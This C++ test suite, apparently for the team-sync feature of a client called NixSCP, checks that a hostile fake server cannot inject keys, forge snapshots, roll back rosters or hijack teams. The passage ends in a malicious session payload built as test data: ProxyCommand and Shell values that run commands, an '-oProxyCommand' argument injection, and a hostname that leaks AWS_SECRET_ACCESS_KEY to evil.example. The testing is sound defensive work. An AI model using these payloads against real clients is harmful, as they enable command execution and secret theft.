// NixSCP Teams against a hostile server: the real CloudSync and TeamSync code
// drives an in-process fake of the cloud API on 127.0.0.1 that can lie in every
// answer, and whose other people ("peers") are built with the same crypto. Each
// scenario runs in its own process (the client classes are singletons) and needs
// no external server. The acceptance properties of Teams v2 and the bugs of the
// 2026-11-05 audit (S1, S2, S4, S5, S6, S8, S20, B1, B2, T3...T22) are proven here.
#include <QCoreApplication>
#include <QProcess>
#include <QTemporaryDir>
#include <QtEndian>

#include <cstdio>
#include <unistd.h>

static int Failures = 0;

#define CHECK(Cond) \
  do { if (!(Cond)) { std::printf("FAIL %s:%d: %s\n", __FILE__, __LINE__, #Cond); std::fflush(stdout); Failures++; } } while (0)
#define CHECK_MSG(Cond, Msg) \
  do { if (!(Cond)) { std::printf("FAIL %s:%d: %s\n  %s\n", __FILE__, __LINE__, #Cond, qPrintable(Msg)); std::fflush(stdout); Failures++; } } while (0)

#include "TeamsFake.h"

//---------------------------------------------------------------------------
// Acceptance 1: a substituted wrap, public key or needs_rotation flag never leads
// to data leaving under a key the server knows (scenarios A and B of the audit)

static void ScenarioServerKey()
{
  Boot();
  Setup S = OwnedTeam();
  QByteArray Attacker(32, 'A');
  FakeTeam & T = Srv->Teams[S.Uuid];
  // the server hands the admin a key of its choice while a local change waits to go up
  T.ServeWrap = TeamCrypto::WrapForMember(UnB64(Srv->Keys[VictimUuid]["public_key"]), Attacker, S.Uuid, T.Roster.KeyVersion);
  Site(S.Folder + QStringLiteral("/db"))->RemoteDirectory = QStringLiteral("/waiting");
  Configuration::Instance().Save();
  int Puts = Srv->Puts;
  Notices.clear();
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK(Srv->Puts == Puts);
  CHECK(Teams().Find(S.Uuid)->Key.IsEmpty());
  // and a head that does not decode, for the old automatic push
  Srv->Publish(T, T.Head + 1, QByteArray("not a snapshot at all, the client will just push"), 1);
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("failed verification")), Error);
  CHECK(Srv->Puts == Puts);
  CHECK(Rejected(S.Uuid));
  CHECK(!Notices.isEmpty());
  CHECK(Site(S.Folder + QStringLiteral("/db")) != nullptr);
  // the same junk head under the real key: an error, never a push
  T.ServeWrap.clear();
  CHECK(!SyncAll());
  CHECK(Srv->Puts == Puts);
  CHECK(Site(S.Folder + QStringLiteral("/db")) != nullptr);
}

static void ScenarioRotateFlag()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  TeamCrypto::KeyPair Mitm = TeamCrypto::NewKeyPair();
  // no one was removed: the flag and a swapped key in the member list mean nothing
  T.SayNeedsRotation = true;
  T.ServeMembers = QJsonArray{QJsonObject{{"user_uuid", S.Bob.Uuid}, {"role", "member"}, {"public_key", B64(Mitm.Public)}},
    QJsonObject{{"user_uuid", NewUuid()}, {"role", "member"}, {"public_key", B64(Mitm.Public)}}};
  Srv->Keys[S.Bob.Uuid]["public_key"] = B64(Mitm.Public);
  Srv->Log.clear();
  CHECK(SyncAll());
  CHECK(!Srv->Log.join(QLatin1Char('\n')).contains(QStringLiteral("/rotate")));
  CHECK(T.Roster.KeyVersion == 1);
  // a signed removal rotates, and wraps only to the keys of the roster
  Peer Carol = NewPeer(QStringLiteral("carol"));
  Srv->PeerJoin(Carol, InviteCode(S.Uuid, QStringLiteral("member")));
  CHECK(SyncAll());
  CHECK(Wait([&](const auto & D) { Teams().RemoveMember(S.Uuid, Carol.Uuid, D); }));
  CHECK(T.Roster.KeyVersion == 2);
  QByteArray NewKey = Teams().Find(S.Uuid)->Key.Copy();
  CHECK(TeamCrypto::UnwrapForMember(S.Bob.Box, T.Wraps.value(S.Bob.Uuid), S.Uuid, 2) == NewKey);
  CHECK(TeamCrypto::UnwrapForMember(Mitm, T.Wraps.value(S.Bob.Uuid), S.Uuid, 2).isEmpty());
  CHECK(TeamCrypto::UnwrapForMember(Carol.Box, T.Wraps.value(Carol.Uuid), S.Uuid, 2).isEmpty());
}

static void ScenarioMemberWrap()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  CHECK(Site(J.Folder + QStringLiteral("/db")) != nullptr);
  FakeTeam & T = Srv->Teams[J.Uuid];
  QByteArray Attacker(32, 'A');
  T.ServeWrap = TeamCrypto::WrapForMember(UnB64(Srv->Keys[VictimUuid]["public_key"]), Attacker, J.Uuid, 1);
  // even a forged snapshot under the key the server chose
  Peer Eve = NewPeer(QStringLiteral("eve"));
  Srv->Publish(T, T.Head + 1, Srv->PeerSnapshot(Eve, T, T.Head + 1, Content(QStringLiteral("Shared"), {{"db", "evil.example", "x"}}), Attacker), 1);
  CHECK(!SyncAll());
  CHECK(Rejected(J.Uuid));
  CHECK(Site(J.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db.internal"));
}

//---------------------------------------------------------------------------
// Acceptance 2: a snapshot forged by a member with the key or by the server is rejected

static void ScenarioForgedSnapshot()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  FakeTeam & T = Srv->Teams[J.Uuid];
  QByteArray Evil = Content(QStringLiteral("Shared"), {{"db", "evil.example", "x"}});
  auto Forged = [&](const QByteArray & Blob)
  {
    qint64 Version = T.Head;
    Srv->Publish(T, Version + 1, Blob, 1);
    Notices.clear();
    CHECK(!SyncAll());
    CHECK(Rejected(J.Uuid));
    CHECK(Site(J.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db.internal"));
    T.Snapshots.remove(Version + 1);
    T.Head = Version;
    CHECK(SyncAll());
    CHECK(!Rejected(J.Uuid));
  };
  // a plain member, who knows the team key
  Peer Mallory = NewPeer(QStringLiteral("mallory"));
  Srv->PeerJoin(Mallory, Srv->PeerInvite(J.Owner, J.Uuid, QStringLiteral("member"), QStringLiteral("Shared")));
  CHECK(SyncAll());
  Forged(Srv->PeerSnapshot(Mallory, T, T.Head + 1, Evil));
  // claiming to be the owner, signed with another key
  Peer Fake = Mallory;
  Fake.Uuid = J.Owner.Uuid;
  Forged(Srv->PeerSnapshot(Fake, T, T.Head + 1, Evil));
  // a stranger to the roster
  Forged(Srv->PeerSnapshot(NewPeer(QStringLiteral("eve")), T, T.Head + 1, Evil));
  // a good signature on a changed snapshot
  QByteArray Good = Srv->PeerSnapshot(J.Owner, T, T.Head + 1, Evil);
  QByteArray Flipped = Good;
  Flipped[Flipped.size() - 80] = static_cast<char>(Flipped.at(Flipped.size() - 80) ^ 1);
  Forged(Flipped);
  // the old format, with the real key: there is no signature to check
  CloudCrypto::SnapshotHeader Old;
  Old.Slot = QStringLiteral("team");
  Old.User = J.Uuid;
  Old.Version = T.Head + 1;
  Old.KeyVersion = 1;
  Old.SavedAt = QDateTime::currentDateTimeUtc();
  Forged(CloudCrypto::EncodeSnapshot(Old, T.Key, Evil));
  // another team's or version's snapshot
  Forged(Srv->PeerSnapshot(J.Owner, T, T.Head + 2, Evil));
  // an honest one goes through
  Srv->PeerPush(J.Owner, J.Uuid, Content(QStringLiteral("Shared"), {{"db", "db2.internal", "pw1"}}));
  CHECK(SyncAll());
  CHECK(Site(J.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db2.internal"));
}

static void ScenarioFormerAdmin()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  FakeTeam & T = Srv->Teams[J.Uuid];
  Peer Dave = NewPeer(QStringLiteral("dave"));
  Srv->PeerJoin(Dave, Srv->PeerInvite(J.Owner, J.Uuid, QStringLiteral("admin"), QStringLiteral("Shared")));
  qint64 DaveSeq = T.Roster.Seq;
  // an admin's last push before the demotion stays valid
  Srv->PeerPush(Dave, J.Uuid, Content(QStringLiteral("Shared"), {{"db", "db.internal", "pw2"}}));
  Srv->PeerRole(J.Owner, J.Uuid, Dave.Uuid, QStringLiteral("member"));
  CHECK(SyncAll());
  CHECK(Site(J.Folder + QStringLiteral("/db"))->Password == QStringLiteral("pw2"));
  // with the server's help they write as if the demotion had not happened yet
  QByteArray Old = Srv->PeerSnapshot(Dave, T, T.Head + 1, Content(QStringLiteral("Shared"), {{"db", "evil.example", "pw2"}}), QByteArray(), DaveSeq);
  Srv->Publish(T, T.Head + 1, Old, 1);
  CHECK(!SyncAll());
  CHECK(Rejected(J.Uuid));
  CHECK(Site(J.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db.internal"));
}

//---------------------------------------------------------------------------
// Acceptance 3: no member without an admin's invite entry and proof of the invite
// secret; a stolen account without the NixSCP password joins no one

static void ScenarioFakeTeam()
{
  Boot();
  // The server runs a team of its own and shows it to the victim: nobody signed the
  // victim into it, so nothing about it is believed
  Peer Evil = NewPeer(QStringLiteral("evil"));
  QString Uuid = Srv->PeerCreate(Evil);
  FakeTeam & T = Srv->Teams[Uuid];
  Srv->PeerPush(Evil, Uuid, Content(QStringLiteral("Prod"), {{"db", "evil.example", "x"}}));
  T.ServeEntries = T.Entries;
  T.HasServeEntries = true;
  T.ServeWrap = TeamCrypto::WrapForMember(TeamCrypto::NewKeyPair().Public, T.Key, Uuid, 1);
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK(Error.contains(QStringLiteral("failed verification")));
  CHECK(Site(QStringLiteral("Team: Prod/db")) == nullptr);
}

static void ScenarioJoinAnchor()
{
  Boot();
  // a real invite, but the server shows the joiner another chain: its own genesis
  Peer Owner = NewPeer(QStringLiteral("owner"));
  QString Uuid = Srv->PeerCreate(Owner);
  Srv->PeerPush(Owner, Uuid, Content(QStringLiteral("Prod"), {{"db", "db.internal", "pw"}}));
  QString Code = Srv->PeerInvite(Owner, Uuid, QStringLiteral("member"), QStringLiteral("Prod"));
  FakeTeam & T = Srv->Teams[Uuid];
  QJsonArray RealEntries = T.Entries;
  Peer Evil = NewPeer(QStringLiteral("evil"));
  TeamRoster::State Fake;
  TeamRoster::Entry Genesis = TeamRoster::Make(Fake, Uuid, "create", Evil.Uuid,
    TeamRoster::CreateData(Evil.Email, Evil.Identity, Evil.Uuid, Evil.Box.Public, QByteArray("wrap")), Evil.Identity);
  QString Why;
  CHECK(TeamRoster::Apply(Fake, Genesis, &Why));
  TeamCrypto::Invite Parsed;
  CHECK(TeamCrypto::ParseInviteCode(Code, Parsed));
  // the fake chain even holds the invite, with the invite's public key, signed by the fake owner
  TeamRoster::Entry FakeInvite = TeamRoster::Make(Fake, Uuid, "invite", Evil.Uuid, QJsonObject{{"id", Parsed.Id}, {"role", "member"},
    {"expires", QDateTime::currentDateTimeUtc().addDays(3).toString("yyyy-MM-ddTHH:mm:ss.zzzZ")},
    {"public", B64(TeamCrypto::InviteSignKey(Parsed).Public)}, {"key_version", 1}}, Evil.Identity);
  CHECK(TeamRoster::Apply(Fake, FakeInvite, &Why));
  T.ServeEntries = QJsonArray{TeamRoster::ToWire(Genesis), TeamRoster::ToWire(FakeInvite)};
  T.HasServeEntries = true;
  QString Error;
  CHECK(!Wait([&](const auto & D) { Teams().JoinWithCode(Code, D); }, &Error));
  CHECK_MSG(Error.contains(QStringLiteral("not the team")), Error);
  CHECK(!T.Roster.Find(VictimUuid));
  // a tampered code opens nothing
  QString Bad = Code;
  Bad[20] = (Bad[20] == QLatin1Char('A')) ? QLatin1Char('B') : QLatin1Char('A');
  CHECK(!Wait([&](const auto & D) { Teams().JoinWithCode(Bad, D); }));
  // the real chain works
  T.HasServeEntries = false;
  CHECK(Wait([&](const auto & D) { Teams().JoinWithCode(Code, D); }, &Error));
  CHECK(T.Roster.Find(VictimUuid) != nullptr);
  CHECK(Teams().Find(Uuid)->Role == QStringLiteral("member"));
  CHECK(Site(QStringLiteral("Team: Prod/db")) != nullptr);
  CHECK(UnB64(Srv->Keys[VictimUuid]["public_key"]) == T.Roster.Find(VictimUuid)->Box);
}

static void ScenarioRogueMember()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  QJsonArray Honest = T.Entries;
  TeamRoster::State Before = T.Roster;
  Peer Eve = NewPeer(QStringLiteral("eve"));
  auto Refuses = [&](const TeamRoster::Entry & Item)
  {
    T.ServeEntries = Honest;
    T.ServeEntries.append(TeamRoster::ToWire(Item));
    T.HasServeEntries = true;
    QString Error;
    CHECK(!SyncAll(&Error));
    CHECK_MSG(Error.contains(QStringLiteral("failed verification")), Error);
    CHECK(Rejected(S.Uuid));
    T.HasServeEntries = false;
    CHECK(SyncAll());
  };
  QByteArray Wrap("wrap");
  // an invite by someone with an account but no identity key of the team: a stranger's signature
  TeamCrypto::Invite Code = TeamCrypto::NewInvite();
  QJsonObject InviteData{{"id", Code.Id}, {"role", "member"}, {"expires", QDateTime::currentDateTimeUtc().addDays(3).toString("yyyy-MM-ddTHH:mm:ss.zzzZ")},
    {"public", B64(TeamCrypto::InviteSignKey(Code).Public)}, {"key_version", 1}};
  Refuses(TeamRoster::Make(Before, S.Uuid, "invite", VictimUuid, InviteData, Eve.Identity));
  // a plain member cannot invite
  Refuses(TeamRoster::Make(Before, S.Uuid, "invite", S.Bob.Uuid, InviteData, S.Bob.Identity));
  // a join with no invite at all
  TeamCrypto::SignKey InviteKey = TeamCrypto::InviteSignKey(Code);
  Refuses(TeamRoster::Make(Before, S.Uuid, "join", Eve.Uuid, TeamRoster::JoinData(Code.Id, Eve.Email, Eve.Identity, Eve.Uuid, Eve.Box.Public, Wrap), Eve.Identity, &InviteKey));
  // a real invite, joined without the secret
  auto RealInvite = [&](const QString & Role)
  {
    TeamCrypto::Invite Real = TeamCrypto::NewInvite();
    QString Text = InviteCode(S.Uuid, Role);
    CHECK(TeamCrypto::ParseInviteCode(Text, Real));
    return Real;
  };
  TeamCrypto::Invite Real = RealInvite(QStringLiteral("member"));
  Honest = T.Entries;
  Before = T.Roster;
  TeamCrypto::SignKey Guess = TeamCrypto::NewSignKey();
  Refuses(TeamRoster::Make(Before, S.Uuid, "join", Eve.Uuid, TeamRoster::JoinData(Real.Id, Eve.Email, Eve.Identity, Eve.Uuid, Eve.Box.Public, Wrap), Eve.Identity, &Guess));
  // the invite's key but not the joiner's own signature
  TeamCrypto::SignKey RealKey = TeamCrypto::InviteSignKey(Real);
  Refuses(TeamRoster::Make(Before, S.Uuid, "join", Eve.Uuid, TeamRoster::JoinData(Real.Id, Eve.Email, Eve.Identity, Eve.Uuid, Eve.Box.Public, Wrap), Guess, &RealKey));
  // each invite works once
  Srv->PeerJoin(NewPeer(QStringLiteral("frank")), Real.Code());
  CHECK(SyncAll());
  Honest = T.Entries;
  Before = T.Roster;
  Refuses(TeamRoster::Make(Before, S.Uuid, "join", Eve.Uuid, TeamRoster::JoinData(Real.Id, Eve.Email, Eve.Identity, Eve.Uuid, Eve.Box.Public, Wrap), Eve.Identity, &RealKey));
  // a removal or a role change by someone who may not
  Refuses(TeamRoster::Make(Before, S.Uuid, "role", S.Bob.Uuid, QJsonObject{{"user", S.Bob.Uuid}, {"role", "admin"}, {"head", 0}}, S.Bob.Identity));
  Refuses(TeamRoster::Make(Before, S.Uuid, "remove", S.Bob.Uuid, QJsonObject{{"user", VictimUuid}, {"head", 0}}, S.Bob.Identity));
  // a rotation by a member, with their own key for everyone
  QJsonObject Hashes;
  for (const TeamRoster::Member & M : Before.Members) Hashes.insert(M.Uuid, QString(64, QLatin1Char('a')));
  Refuses(TeamRoster::Make(Before, S.Uuid, "rotate", S.Bob.Uuid, QJsonObject{{"key_version", 2}, {"wraps", Hashes}}, S.Bob.Identity));
}

static void ScenarioStolenAccount()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  QByteArray Mine = UnB64(Srv->Keys[VictimUuid]["public_key"]);
  // someone with the account (not the NixSCP password) replaced the stored public
  // keys and the wrapped private key: this computer keeps its own
  TeamCrypto::KeyPair Thief = TeamCrypto::NewKeyPair();
  QJsonObject Saved = Srv->Keys[VictimUuid];
  Srv->Keys[VictimUuid]["public_key"] = B64(Thief.Public);
  Srv->Keys[VictimUuid]["identity_key"] = B64(TeamCrypto::NewSignKey().Public);
  Srv->Keys[S.Bob.Uuid]["public_key"] = B64(Thief.Public);
  CHECK(SyncAll());
  // the rotation after a removal uses the signed keys only
  Peer Carol = NewPeer(QStringLiteral("carol"));
  Srv->PeerJoin(Carol, InviteCode(S.Uuid, QStringLiteral("member")));
  CHECK(SyncAll());
  CHECK(Wait([&](const auto & D) { Teams().RemoveMember(S.Uuid, Carol.Uuid, D); }));
  CHECK(T.Roster.KeyVersion == 2);
  for (auto It = T.Wraps.cbegin(); It != T.Wraps.cend(); ++It)
  {
    CHECK(TeamCrypto::UnwrapForMember(Thief, It.value(), S.Uuid, 2).isEmpty());
  }
  CHECK(T.Roster.Find(VictimUuid)->Box == Mine);
  // a computer that has the account's keys refuses to work with others
  TeamCrypto::KeyPair OtherBox = TeamCrypto::NewKeyPair();
  TeamCrypto::SignKey OtherIdentity = TeamCrypto::NewSignKey();
  Srv->Keys[VictimUuid] = Saved;
  Srv->Keys[VictimUuid]["wrapped_private_key"] = B64(TeamCrypto::WrapPrivateKey(CloudSync::Instance().DataKey(), TeamCrypto::KeyBlob(OtherBox, OtherIdentity)));
  CHECK(SyncAll());   // it uses what it holds
  CHECK(Teams().Find(S.Uuid)->Error.isEmpty());
}

//---------------------------------------------------------------------------
// Acceptance 4: rollback or a fork on an established client is detected

static void ScenarioRollback()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  AddSite(S.Folder + QStringLiteral("/web"), QStringLiteral("web.internal"));
  CHECK(SyncAll());
  Peer Carol = NewPeer(QStringLiteral("carol"));
  Srv->PeerJoin(Carol, InviteCode(S.Uuid, QStringLiteral("admin")));
  CHECK(SyncAll());
  qint64 Head = T.Head;
  CHECK(Head >= 2);
  int Puts = Srv->Puts;
  QJsonArray Entries = T.Entries;

  // a shorter roster
  T.ServeEntries = QJsonArray();
  for (int I = 0; I < Entries.size() - 2; I++) T.ServeEntries.append(Entries.at(I));
  T.HasServeEntries = true;
  QString Error;
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("went back")), Error);
  CHECK(Rejected(S.Uuid));

  // a fork: the same length, another last entry
  T.ServeEntries = Entries;
  TeamRoster::State Short;
  for (int I = 0; I < Entries.size() - 1; I++)
  {
    TeamRoster::Entry Item;
    TeamRoster::Parse(Entries.at(I).toObject(), Item);
    TeamRoster::Apply(Short, Item);
  }
  TeamRoster::Entry Forked = TeamRoster::Make(Short, S.Uuid, "leave", S.Bob.Uuid, QJsonObject{{"head", 0}}, S.Bob.Identity);
  T.ServeEntries.removeLast();
  T.ServeEntries.append(TeamRoster::ToWire(Forked));
  CHECK(!SyncAll(&Error));
  CHECK(Rejected(S.Uuid));
  T.HasServeEntries = false;

  // the content: a lower head
  T.ServeHead = Head - 1;
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("went back")), Error);
  CHECK(Rejected(S.Uuid));
  T.ServeHead = -1;

  // the same version, other bytes (signed by a real admin: a server's fork)
  QByteArray Fork = Srv->PeerSnapshot(Carol, T, Head, Content(QStringLiteral("Prod"), {{"db", "evil.example", "x"}}));
  QByteArray Real = T.Snapshots.value(Head);
  T.Snapshots[Head] = Fork;
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("rewritten")), Error);
  T.Snapshots[Head] = Real;

  // the next version does not continue what this computer saw
  QByteArray Skew = Srv->PeerSnapshot(Carol, T, Head + 1, Content(QStringLiteral("Prod"), {{"db", "evil.example", "x"}}));
  T.Snapshots[Head] = Fork;
  Skew = Srv->PeerSnapshot(Carol, T, Head + 1, Content(QStringLiteral("Prod"), {{"db", "evil.example", "x"}}));
  T.Snapshots[Head] = Real;
  Srv->Publish(T, Head + 1, Skew, 1);
  CHECK(!SyncAll(&Error));
  CHECK_MSG(Error.contains(QStringLiteral("rewritten")), Error);
  T.Snapshots.remove(Head + 1);
  T.Head = Head;

  // nothing was touched or sent
  CHECK(Srv->Puts == Puts);
  CHECK(Site(S.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db.internal"));
  CHECK(Site(S.Folder + QStringLiteral("/web")) != nullptr);
  CHECK(SyncAll(&Error));
}

static void ScenarioKeyRollback()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  FakeTeam & T = Srv->Teams[J.Uuid];
  QByteArray OldKey = T.Key;
  QByteArray OldWrap = T.Wraps.value(VictimUuid);
  Srv->PeerRotate(J.Owner, J.Uuid);
  CHECK(SyncAll());
  CHECK(Teams().Find(J.Uuid)->KeyVersion == 2);
  // an old wrap of the victim's own, which was once genuine
  T.ServeWrap = OldWrap;
  T.ServeKeyVersion = 1;
  CHECK(!SyncAll());
  CHECK(Rejected(J.Uuid));
  T.ServeWrap.clear();
  T.ServeKeyVersion = 0;
  // a head under the old key, signed by the owner when it was fine
  Srv->Publish(T, T.Head + 1, Srv->PeerSnapshot(J.Owner, T, T.Head + 1, Content(QStringLiteral("Shared"), {{"db", "old.internal", "pw1"}}), OldKey, 2, 1), 1);
  CHECK(!SyncAll());
  CHECK(Rejected(J.Uuid));
  CHECK(Site(J.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db.internal"));
}

static void ScenarioPinsSurvive()
{
  // the pins live in the sealed state file: a restart still knows them
  Boot();
  Setup S = OwnedTeam();
  CHECK(SyncAll());
  QFile File(Dir + QStringLiteral("/nixscp-teams.ini"));
  CHECK(File.open(QIODevice::ReadOnly));
  QByteArray Data = File.readAll();
  CHECK(ConfigVault::IsSealed(Data));
  CHECK(!Data.contains("RosterSeq"));
  File.close();
  Teams().Initialize(Configuration::Instance(), CloudSync::Instance());
  FakeTeam & T = Srv->Teams[S.Uuid];
  T.ServeEntries = QJsonArray{T.Entries.at(0)};
  T.HasServeEntries = true;
  CHECK(!SyncAll());
  CHECK(Rejected(S.Uuid));
}

//---------------------------------------------------------------------------
// Acceptance 5: same names, duplicate renames, odd whitespace mix or wipe nothing

static void ScenarioSameNames()
{
  Boot();
  // a personal folder of that name stays out of it
  AddSite(QStringLiteral("Team: Ops/personal"), QStringLiteral("mine.internal"));
  AddSite(QStringLiteral("team: dev/other"), QStringLiteral("mine2.internal"));
  QString A = CreateTeam(QStringLiteral("Ops"));
  QString B = CreateTeam(QStringLiteral("Ops"));
  QString C = CreateTeam(QStringLiteral("ops"));
  QString D = CreateTeam(QStringLiteral("Dev"));
  QString E = CreateTeam(QStringLiteral("a/b"));
  QString F = CreateTeam(QStringLiteral("a-b"));
  QStringList Folders{FolderOf(A), FolderOf(B), FolderOf(C), FolderOf(D), FolderOf(E), FolderOf(F)};
  CHECK(Folders.count() == 6);
  QSet<QString> Unique;
  for (const QString & Folder : Folders) Unique.insert(Folder.toLower());
  CHECK(Unique.size() == 6);
  CHECK(!Unique.contains(QStringLiteral("team: ops")));
  CHECK(!Unique.contains(QStringLiteral("team: dev")));
  AddSite(FolderOf(A) + QStringLiteral("/a-site"), QStringLiteral("a.internal"), QStringLiteral("pw-a"));
  AddSite(FolderOf(B) + QStringLiteral("/b-site"), QStringLiteral("b.internal"), QStringLiteral("pw-b"));
  CHECK(SyncAll());
  auto Names = [&](const QString & Uuid)
  {
    QString Name;
    QStringList List;
    const FakeTeam & T = Srv->Teams[Uuid];
    CHECK(Read(T.Snapshots.value(T.Head), Teams().Find(Uuid)->Key.Copy(), Name, List));
    return List;
  };
  CHECK(Names(A) == QStringList({QStringLiteral("a-site")}));
  CHECK(Names(B) == QStringList({QStringLiteral("b-site")}));
  CHECK(Names(C).isEmpty());
  CHECK(Site(QStringLiteral("Team: Ops/personal"))->HostName == QStringLiteral("mine.internal"));
  CHECK(Site(QStringLiteral("team: dev/other")) != nullptr);
  // a team of a peer named like them all
  Joined J = MemberOf(QStringLiteral("Ops"), {{"evil", "evil.example", "x"}});
  CHECK(!J.Folder.isEmpty() && !Unique.contains(J.Folder.toLower()));
  CHECK(Site(J.Folder + QStringLiteral("/evil")) != nullptr);
  CHECK(Site(FolderOf(A) + QStringLiteral("/a-site")) != nullptr);
  CHECK(Site(QStringLiteral("Team: Ops/personal")) != nullptr);
  // T21: not every "team: " folder is a team; this one syncs as a personal site
  CHECK(!CloudSettings::IsDeviceLocalSection(QStringLiteral("Sessions\\") + MungeStr(QStringLiteral("team: dev/other"), false), QString()));
  CHECK(CloudSettings::IsDeviceLocalSection(QStringLiteral("Sessions\\") + MungeStr(QStringLiteral("Team: dev/other"), false), QString()));
}

// S4, D1 and D2 of the audit: an admin renames their team to the victim's other
// team. The victim's two teams stay apart, whatever the victim's roles.
static void ScenarioRenameAttack()
{
  Boot();
  Setup Prod = OwnedTeam();
  Joined Evil = MemberOf(QStringLiteral("Evil"), {{"db", "evil.example", "attacker"}});
  CHECK(Evil.Folder == QStringLiteral("Team: Evil"));
  qint64 ProdHead = Srv->Teams[Prod.Uuid].Head;
  int Puts = Srv->Puts;
  Srv->PeerPush(Evil.Owner, Evil.Uuid, Content(QStringLiteral("Prod"), {{"db", "evil.example", "attacker"}}));
  CHECK(SyncAll());
  CHECK(SyncAll());
  const TeamSync::Team * T = Teams().Find(Evil.Uuid);
  CHECK(T->Name == QStringLiteral("Prod"));
  CHECK(T->Folder != Prod.Folder);
  CHECK(T->Folder.startsWith(QStringLiteral("Team: Prod")));
  CHECK(Srv->Teams[Prod.Uuid].Head == ProdHead);
  CHECK(Srv->Puts == Puts);
  CHECK(Site(Prod.Folder + QStringLiteral("/db"))->HostName == QStringLiteral("db.internal"));
  CHECK(Site(T->Folder + QStringLiteral("/db"))->HostName == QStringLiteral("evil.example"));
}

// B2, scenario R: another admin renames the team; nothing is pushed, nothing lost
static void ScenarioRenameByOther()
{
  Boot();
  Setup S = OwnedTeam(QStringLiteral("admin"));
  Site(S.Folder + QStringLiteral("/db"))->AgentAccess = 2;
  Site(S.Folder + QStringLiteral("/db"))->AgentName = QStringLiteral("mine");
  Configuration::Instance().Save();
  FakeTeam & T = Srv->Teams[S.Uuid];
  QByteArray Plain;
  CHECK(TeamCrypto::DecodeSnapshot(T.Snapshots.value(T.Head), S.Key, Plain));
  QString Name;
  IniFile Ini;
  CHECK(TeamContent::Decode(Plain, Name, Ini));
  T.Key = S.Key;
  Srv->PeerPush(S.Bob, S.Uuid, TeamContent::Encode(QStringLiteral("Production"), Ini));
  qint64 Head = T.Head;
  CHECK(SyncAll());
  CHECK(SyncAll());
  CHECK(T.Head == Head);
  CHECK(Teams().Find(S.Uuid)->Name == QStringLiteral("Production"));
  CHECK(FolderOf(S.Uuid) == QStringLiteral("Team: Production"));
  auto Moved = Site(QStringLiteral("Team: Production/db"));
  CHECK(Moved != nullptr);
  CHECK(Site(S.Folder + QStringLiteral("/db")) == nullptr);
  // T13: personal settings go along with the folder
  CHECK((Moved != nullptr) && (Moved->AgentAccess == 2) && (Moved->AgentName == QStringLiteral("mine")));
}

// B2 alone: a rename with odd whitespace, on the only device
static void ScenarioRenameSpaces()
{
  Boot();
  Setup S = OwnedTeam();
  FakeTeam & T = Srv->Teams[S.Uuid];
  CHECK(Wait([&](const auto & D) { Teams().Rename(S.Uuid, QStringLiteral("  Pw \t  Two\n"), D); }));
  CHECK(Teams().Find(S.Uuid)->Name == QStringLiteral("Pw Two"));
  CHECK(FolderOf(S.Uuid) == QStringLiteral("Team: Pw Two"));
  CHECK(Site(QStringLiteral("Team: Pw Two/db")) != nullptr);
  CHECK(SyncAll());
  QString Name;
  QStringList List;
  CHECK(Read(T.Snapshots.value(T.Head), S.Key, Name, List));
  CHECK(Name == QStringLiteral("Pw Two"));
  CHECK(List == QStringList({QStringLiteral("db")}));
  // the server never saw the name
  CHECK(!Srv->Log.join(QLatin1Char('\n')).contains(QStringLiteral("Pw Two")));
  QByteArray AllBodies;
  for (const QJsonValue & V : T.Entries) AllBodies += UnB64(V.toObject()["body"]);
  CHECK(!AllBodies.contains("Pw Two") && !AllBodies.contains("Prod"));
  CHECK(!T.Snapshots.value(T.Head).contains("Pw Two"));
}

//---------------------------------------------------------------------------
// Acceptance 6: a team snapshot cannot execute anything (S1)

static void ScenarioMarker()
{
  Boot();
  Joined J = MemberOf(QStringLiteral("Shared"), {{"db", "db.internal", "pw1"}});
  QString Marker = Dir + QStringLiteral("/PWNED");
  QByteArray Evil = QStringLiteral("[NixSCP\\Team]\nName=Shared\n[Sessions\\db]\nHostName=127.0.0.1\nPortNumber=1\nUserName=deploy\nPasswordPlain=pw1\nFSProtocol=2\n"
    "ProxyMethod=5\nProxyTelnetCommand=sh -c 'touch %1'\nProxyHost=evil.example\nSshHostKey=*\nAgentFwd=1\nTryAgent=1\nPostLoginCommands=touch %1\n"
    "Shell=touch %1\nSftpServer=/bin/sh -c 'touch %1'\nTunnel=1\nTunnelHostName=evil.example\nPortForwards=x|1|evil.example|1\nKnownHostsFile=/tmp/x\n"
    "LogicalHostName=victim.example\nPublicKeyFile=/home/x/.ssh/id\nAgentAccess=2\nAgentAllow=rm\nRecycleBinPath=/tmp\nListingCommand=touch %1\nIsWorkspace=1\nSpecial=1\n"
    "SomethingNewNobodyKnows=1\n"
    "[Sessions\\Default%20Settings]\nProxyMethod=5\nProxyTelnetCommand=touch %1\n"
    "[Sessions\\env]\nHostName=$AWS_SECRET_ACCESS_KEY.evil.example\nUserName=deploy\n"
    "[Sessions\\env2]\nHostName=evil.example\nUserName=${HOME}\n"
    "[Sessions\\dash]\nHostName=-oProxyCommand=touch\n"
    "[Sessions\\exact]\nHostName=ok.example\nSshHostKey=ssh-ed25519 255 SHA256:abcdefghijklmnopqrstuvwxyz0123456789ABCDEFG\n"
    "[Sessions\\policy]\nHostName=ok2.example\nSshHostKey=acceptnew\n"
